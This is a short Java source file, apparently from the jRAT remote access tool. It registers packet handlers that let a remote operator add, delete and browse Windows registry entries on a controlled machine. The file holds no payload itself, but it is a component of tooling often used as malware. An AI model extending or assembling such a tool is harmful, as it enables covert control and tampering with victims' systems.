package jrat.module.registry;

import jrat.api.Module;
import jrat.client.packets.incoming.AbstractIncomingPacket;

public class RegistryClientModule extends Module {

    public RegistryClientModule(int seed) {
        super(seed);
    }

    public void init() {
        AbstractIncomingPacket.PACKETS_INCOMING.put((short) 97, Packet97RegistryAdd.class);
        AbstractIncomingPacket.PACKETS_INCOMING.put((short) 99, Packet99RegistryDelete.class);
        AbstractIncomingPacket.PACKETS_INCOMING.put((short) 79, Packet79BrowseRegistry.class);
        System.out.println("RegistryClientModule initialized");
    }
}
